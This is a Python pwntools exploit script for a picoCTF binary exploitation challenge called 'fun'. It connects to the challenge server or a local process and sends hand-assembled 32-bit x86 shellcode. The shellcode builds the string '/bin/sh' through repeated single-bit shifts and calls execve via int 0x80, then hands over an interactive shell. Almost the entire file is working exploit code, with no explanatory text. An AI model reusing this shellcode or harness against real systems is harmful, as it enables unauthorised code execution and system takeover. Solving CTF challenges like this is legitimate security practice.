#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./fun"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("mercury.picoctf.net", 28494)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *execute+211
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = asm("""
            /* cleaning */
            xor eax, eax
            xor ebx, ebx
            xor ecx, ecx
            xor edx, edx
            /* reservate "/bin/sh" space */
            push eax
            push eax
            /* save esp ot edi */
            mov edi, esp
            pop eax
            pop eax
            /* set 11 to eax */
            mov al, 0xb
            /* push 0x0068732f at stack */
            mov bl,0x68
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            mov bl,0x73
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            mov bl,0x2f
            push ebx
            /* push 0x6e69622f at stack */
            nop
            xor ebx, ebx
            mov bl,0x6e
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            mov bl,0x69
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            mov bl,0x62
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            shl ebx,1
            mov bl,0x2f
            push ebx
            /* set *"/bin/sh" to ebx */
            nop
            mov ebx, edi
            /* set ecx and edx to NULL */
            xor ecx, ecx
            xor edx, edx
            int 0x80
            pop eax
            pop eax
        """)

p.recvuntil(":")
p.sendline(payload)

p.interactive()
